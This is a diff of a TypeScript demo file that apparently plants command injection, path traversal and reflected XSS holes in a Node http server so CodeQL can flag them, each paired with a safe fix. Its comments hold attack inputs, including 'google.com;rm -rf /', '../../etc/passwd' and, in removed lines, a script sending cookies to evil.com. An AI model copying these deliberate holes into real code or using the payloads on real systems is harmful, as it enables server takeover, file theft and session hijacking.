@@ -5,108 +5,122 @@
 // CodeQL performs static analysis — it traces data flow through the code
 // to find patterns that could be exploited by attackers.
 //
-// Unlike a simple pattern matcher, CodeQL understands that user input
-// flowing into a database query without sanitization is dangerous, even
-// if it passes through multiple functions first.
+// These examples use Node.js built-in modules (http, fs, child_process)
+// so CodeQL can fully resolve the data flow without external dependencies.
 // =============================================================================
 
-import { Request, Response } from 'express';
+import * as http from 'http';
+import * as fs from 'fs';
+import * as url from 'url';
+import { exec } from 'child_process';
 
 // ---------------------------------------------------------------------------
-// VULNERABILITY 1: SQL Injection
+// VULNERABILITY 1: Command Injection
 // Severity: Critical (CVSS 9.0+)
 // ---------------------------------------------------------------------------
 // CodeQL traces the data flow:
-//   req.query.id (user input) → string concatenation → SQL query
-//
-// WHY THIS IS DANGEROUS: An attacker can send ?id=1' OR '1'='1 to dump
-// the entire table, or ?id=1'; DROP TABLE forms;-- to delete data.
-// SQL injection is consistently in the OWASP Top 10 and is one of the
-// most exploited vulnerabilities in web applications.
-//
-// HOW TO FIX: Use parameterized queries (which TypeORM does by default).
-//   Instead of: `SELECT * FROM forms WHERE id = '${id}'`
-//   Use:        repository.findOne({ where: { id } })
-// ---------------------------------------------------------------------------
-export async function getFormById(req: Request, res: Response) {
-  const formId = req.query.id as string;
-
-  // BAD: User input directly concatenated into SQL query
-  const query = `SELECT * FROM form_definitions WHERE form_id = '${formId}'`;
-
-  // In a real app this would execute against the database
-  // CodeQL flags this because untrusted data flows into a SQL string
-  return res.json({ query });
-}
-
-// ---------------------------------------------------------------------------
-// VULNERABILITY 2: Cross-Site Scripting (XSS) — Reflected
-// Severity: High (CVSS 7.0+)
-// ---------------------------------------------------------------------------
-// CodeQL traces the data flow:
-//   req.query.name (user input) → string interpolation → HTML response
-//
-// WHY THIS IS DANGEROUS: An attacker can craft a URL like:
-//   /search?name=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
-// When a victim clicks the link, the script runs in their browser and
-// steals their session cookie.
-//
-// HOW TO FIX: Escape HTML entities before rendering, or use a templating
-// engine that auto-escapes (React does this by default).
-// ---------------------------------------------------------------------------
-export function searchForms(req: Request, res: Response) {
-  const searchTerm = req.query.name as string;
-
-  // BAD: User input directly embedded in HTML response without escaping
-  const html = `<html><body><h1>Search results for: ${searchTerm}</h1></body></html>`;
-
-  return res.send(html);
-}
-
-// ---------------------------------------------------------------------------
-// VULNERABILITY 3: Path Traversal
-// Severity: High (CVSS 7.0+)
-// ---------------------------------------------------------------------------
-// CodeQL traces the data flow:
-//   req.params.filename (user input) → path concatenation → file read
+//   request URL (user input) → url.parse → exec() shell command
 //
 // WHY THIS IS DANGEROUS: An attacker can send:
-//   /files/../../etc/passwd  or  /files/../../.env
-// to read arbitrary files from the server, including environment variables,
-// private keys, and configuration files.
+//   /lookup?host=google.com;rm -rf /
+// The semicolon breaks out of the intended command and executes arbitrary
+// shell commands on the server. This gives full control of the machine.
 //
-// HOW TO FIX: Validate the filename, use path.resolve() and verify the
-// resolved path is within the allowed directory.
+// HOW TO FIX: Never pass user input to exec(). Use execFile() with an
+// argument array, or use a purpose-built library (e.g. dns.lookup()).
 // ---------------------------------------------------------------------------
-import * as fs from 'fs';
-import * as path from 'path';
+const server = http.createServer((req, res) => {
+  const parsedUrl = url.parse(req.url || '', true);
+  const pathname = parsedUrl.pathname;
+  const query = parsedUrl.query;
 
-export function downloadFile(req: Request, res: Response) {
-  const filename = req.params.filename;
+  if (pathname === '/lookup') {
+    const host = query.host as string;
 
-  // BAD: User input directly used in file path without validation
-  const filePath = path.join('/uploads', filename);
+    // BAD: User input directly interpolated into a shell command
+    exec(`nslookup ${host}`, (error, stdout) => {
+      res.writeHead(200, { 'Content-Type': 'text/plain' });
+      res.end(stdout || 'No result');
+    });
+  }
 
-  // CodeQL flags this because untrusted data flows into a file system operation
-  const content = fs.readFileSync(filePath, 'utf-8');
-  return res.send(content);
-}
+  // ---------------------------------------------------------------------------
+  // VULNERABILITY 2: Path Traversal / Arbitrary File Read
+  // Severity: High (CVSS 7.0+)
+  // ---------------------------------------------------------------------------
+  // CodeQL traces the data flow:
+  //   request URL (user input) → url.parse → fs.readFileSync
+  //
+  // WHY THIS IS DANGEROUS: An attacker can send:
+  //   /file?name=../../etc/passwd
+  // to read any file on the server — environment variables, private keys,
+  // database credentials, source code.
+  //
+  // HOW TO FIX: Validate the resolved path stays within the allowed directory.
+  // ---------------------------------------------------------------------------
+  if (pathname === '/file') {
+    const filename = query.name as string;
+
+    // BAD: User input flows directly into file system read
+    const content = fs.readFileSync('/uploads/' + filename, 'utf-8');
+    res.writeHead(200, { 'Content-Type': 'text/plain' });
+    res.end(content);
+  }
+
+  // ---------------------------------------------------------------------------
+  // VULNERABILITY 3: Reflected Cross-Site Scripting (XSS)
+  // Severity: High (CVSS 7.0+)
+  // ---------------------------------------------------------------------------
+  // CodeQL traces the data flow:
+  //   request URL (user input) → url.parse → HTTP response body
+  //
+  // WHY THIS IS DANGEROUS: An attacker crafts a URL like:
+  //   /search?q=<script>steal(document.cookie)</script>
+  // When a victim clicks the link, the script executes in their browser
+  // and can steal session tokens, redirect to phishing pages, or modify
+  // the page content.
+  //
+  // HOW TO FIX: Escape HTML entities before including user input in responses.
+  // ---------------------------------------------------------------------------
+  if (pathname === '/search') {
+    const searchQuery = query.q as string;
+
+    // BAD: User input directly embedded in HTML response
+    res.writeHead(200, { 'Content-Type': 'text/html' });
+    res.end(`<html><body><h1>Results for: ${searchQuery}</h1></body></html>`);
+  }
+});
+
+server.listen(3001);
 
 // ---------------------------------------------------------------------------
 // THE CORRECT WAY — What CodeQL will NOT flag:
 // ---------------------------------------------------------------------------
-// These patterns are safe because they use parameterized queries,
-// output encoding, and input validation.
-// ---------------------------------------------------------------------------
 
-// SAFE: Parameterized query (TypeORM handles escaping)
-export async function safeGetFormById(formId: string) {
-  // TypeORM's query builder uses parameterized queries internally
-  // return formRepository.findOne({ where: { formId } });
-  return { formId }; // Placeholder for demo
+// SAFE: Use execFile with argument array (no shell interpretation)
+import { execFile } from 'child_process';
+
+function safeLookup(host: string, callback: (result: string) => void) {
+  // execFile doesn't invoke a shell — arguments are passed directly
+  execFile('nslookup', [host], (error, stdout) => {
+    callback(stdout || 'No result');
+  });
 }
 
-// SAFE: Using a framework that auto-escapes (React, or manual escaping)
+// SAFE: Validate resolved path stays within allowed directory
+import * as path from 'path';
+
+function safeReadFile(filename: string): string | null {
+  const uploadsDir = path.resolve('/uploads');
+  const resolved = path.resolve(uploadsDir, filename);
+
+  if (!resolved.startsWith(uploadsDir)) {
+    return null; // Path traversal attempt blocked
+  }
+  return fs.readFileSync(resolved, 'utf-8');
+}
+
+// SAFE: Escape HTML entities before rendering
 function escapeHtml(text: string): string {
   return text
     .replace(/&/g, '&amp;')
@@ -115,23 +129,4 @@ function escapeHtml(text: string): string {
     .replace(/"/g, '&quot;');
 }
 
-export function safeSearchForms(req: Request, res: Response) {
-  const searchTerm = escapeHtml(req.query.name as string);
-  const html = `<html><body><h1>Search results for: ${searchTerm}</h1></body></html>`;
-  return res.send(html);
-}
-
-// SAFE: Validate filename and resolve path within allowed directory
-export function safeDownloadFile(req: Request, res: Response) {
-  const filename = req.params.filename;
-  const uploadsDir = path.resolve('/uploads');
-  const filePath = path.resolve(uploadsDir, filename);
-
-  // Verify the resolved path is still within the uploads directory
-  if (!filePath.startsWith(uploadsDir)) {
-    return res.status(403).json({ error: 'Access denied' });
-  }
-
-  const content = fs.readFileSync(filePath, 'utf-8');
-  return res.send(content);
-}
+export { safeLookup, safeReadFile, escapeHtml };
